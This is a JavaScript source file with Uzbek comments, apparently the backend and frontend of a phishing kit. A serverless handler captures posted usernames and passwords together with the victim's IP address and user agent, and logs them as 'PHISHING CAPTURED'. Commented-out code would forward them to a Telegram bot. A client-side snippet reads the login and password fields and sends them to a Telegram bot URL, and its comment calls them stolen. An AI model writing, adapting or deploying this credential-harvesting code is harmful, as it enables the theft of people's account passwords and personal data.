export default async function handler(req, res) {
    // CORS sozlamalari
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }
    
    if (req.method === 'POST') {
        try {
            const { username, password } = req.body;
            
            // IP va User-Agent olish
            const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
                      req.headers['x-real-ip'] || 
                      req.connection?.remoteAddress || 
                      'unknown';
            
            const userAgent = req.headers['user-agent'] || 'unknown';
            const timestamp = new Date().toISOString();
            
            // Ma'lumotlar
            const capturedData = {
                timestamp,
                ip,
                userAgent: userAgent.substring(0, 100), // Qisqartirish
                username,
                password
            };
            
            // Vercel logs da ko'rish uchun
            console.log('🔥 PHISHING CAPTURED:', JSON.stringify(capturedData, null, 2));
            
            // Telegram ga yuborish (ixtiyoriy - keyin sozlaysan)
            // const telegramUrl = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;
            // await fetch(telegramUrl, {
            //     method: 'POST',
            //     headers: { 'Content-Type': 'application/json' },
            //     body: JSON.stringify({
            //         chat_id: process.env.CHAT_ID,
            //         text: `🆘 YANGI LOGIN!\n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n📱 Device: ${userAgent.substring(0, 50)}`
            //     })
            // });
            
            res.status(200).json({ success: true, message: 'Captured!' });
            
        } catch (error) {
            console.error('❌ XATO:', error);
            res.status(500).json({ error: 'Server xatosi' });
        }
    } else {
        res.status(405).json({ error: 'Faqat POST method' });
    }
}
// Foydalanuvchi login shakliga login va parol yozadi
const username = document.getElementById("login").value;
const password = document.getElementById("password").value;

// Telegram bot tokeni va chat ID
const telegramUrl = `https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage`;

// O'g'irlangan login va parolni yuboradi
await fetch(telegramUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        chat_id: '987654321',
        text: `❌ Login urinish!\n👤 Username: ${username}\n🔑 Password: ${password}`
    })
});
